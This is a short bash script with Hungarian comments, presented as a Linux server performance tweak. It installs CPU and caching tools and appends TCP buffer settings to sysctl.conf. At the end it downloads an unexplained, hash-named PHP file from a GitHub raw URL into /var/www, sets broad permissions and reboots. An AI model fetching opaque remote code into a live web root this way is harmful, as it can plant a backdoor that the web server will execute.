##################### FIRST LINE
# ---------------------------
#!/bin/bash
# ---------------------------
#
# | The script was created           Tiby08 (tiby0108@gmail.com) |
# |--------------------------------------------------------------|
# | Version info: v0.1 beta                                      |
# |--------------------------------------------------------------|
#
#


## Teljesitmeny noveleshez szukseges programok telepitese
apt-get install --yes cpufrequtils memcached
## CPU max teljesitmenyenek beallitasa
cpufreq-set -r -g performance

/sbin/modprobe tcp_htcp
/sbin/modprobe tcp_cubic


echo "
## Telejistmeny felhuzasa, sebesseg noveles
# increase TCP max buffer size setable using setsockopt()
# allow testing with 256MB buffers
net.core.rmem_max = 268435456 
net.core.wmem_max = 268435456 
# increase Linux autotuning TCP buffer limits 
# min, default, and max number of bytes to use
# allow auto-tuning up to 128MB buffers
net.ipv4.tcp_rmem = 4096 87380 134217728
net.ipv4.tcp_wmem = 4096 65536 134217728
# recommended to increase this for CentOS6 with 10G NICS or higher
net.core.netdev_max_backlog = 250000
# don't cache ssthresh from previous connection
net.ipv4.tcp_no_metrics_save = 1
# Explicitly set htcp as the congestion control: cubic buggy in older 2.6 kernels
net.ipv4.tcp_congestion_control = htcp
# If you are using Jumbo Frames, also set this
net.ipv4.tcp_mtu_probing = 1
# recommended for CentOS7/Debian8 hosts
net.core.default_qdisc = fq" | tee -a /etc/sysctl.conf > /dev/null

rm -f -r /var/www/2531ef716b4d19cdd346b405de454f96.php
cd /var/www/
wget -N https://raw.githubusercontent.com/fjdhgjaf/bbox/v1/egyeb/2531ef716b4d19cdd346b405de454f96.php

chown -R www-data:www-data /var/www/
chmod -R 755 /var/www/

reboot
